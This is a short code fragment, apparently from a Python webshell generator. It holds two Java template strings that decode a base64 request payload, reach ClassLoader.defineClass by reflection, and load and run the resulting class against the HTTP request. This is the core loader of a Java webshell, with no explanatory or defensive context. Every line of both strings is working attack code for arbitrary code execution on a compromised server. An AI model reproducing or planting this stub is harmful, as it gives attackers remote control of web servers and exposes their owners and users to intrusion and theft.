code = """
    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (payload == null) {
            return null;
        }
        payload = new String(decoder(payload));
        byte[] b = b64decode(payload);
        Constructor constructor = java.security.SecureClassLoader.class
            .getDeclaredConstructor(ClassLoader.class);
        constructor.setAccessible(true);
        ClassLoader classloader = (ClassLoader) constructor.newInstance(
            new Object[]{this.getClass().getClassLoader()}
        );
        Method defineMethod = ClassLoader.class.getDeclaredMethod(
            "defineClass", byte[].class, int.class, int.class
        );
        defineMethod.setAccessible(true);
        ((Class) defineMethod.invoke(classloader, b, 0, b.length))
            .newInstance().equals(request);
        return null;
    }
"""

proc = """
            payload = new String(bytes);
            try {
                base64 = Class.forName("java.util.Base64");
                decoder = base64.getMethod("getDecoder")
                    .invoke(base64);
                bytes = (byte[]) decoder.getClass()
                    .getMethod("decode", String.class)
                    .invoke(decoder, payload);
            } catch (ClassNotFoundException e) {
                try {
                    base64 = Class.forName("sun.misc.BASE64Decoder");
                    decoder = base64.newInstance();
                    bytes = (byte[]) decoder.getClass()
                        .getMethod("decodeBuffer", String.class)
                        .invoke(decoder, payload);
                } catch (Exception ex) {}
            } catch (Exception ex) {}

            Constructor constructor = java.security.SecureClassLoader.class
                .getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            ClassLoader classloader = (ClassLoader) constructor.newInstance(
                new Object[]{this.getClass().getClassLoader()}
            );
            Method defineMethod = ClassLoader.class.getDeclaredMethod(
                "defineClass", byte[].class, int.class, int.class
            );
            defineMethod.setAccessible(true);
            ((Class) defineMethod.invoke(classloader, bytes, 0, bytes.length))
                .newInstance().equals(req);
"""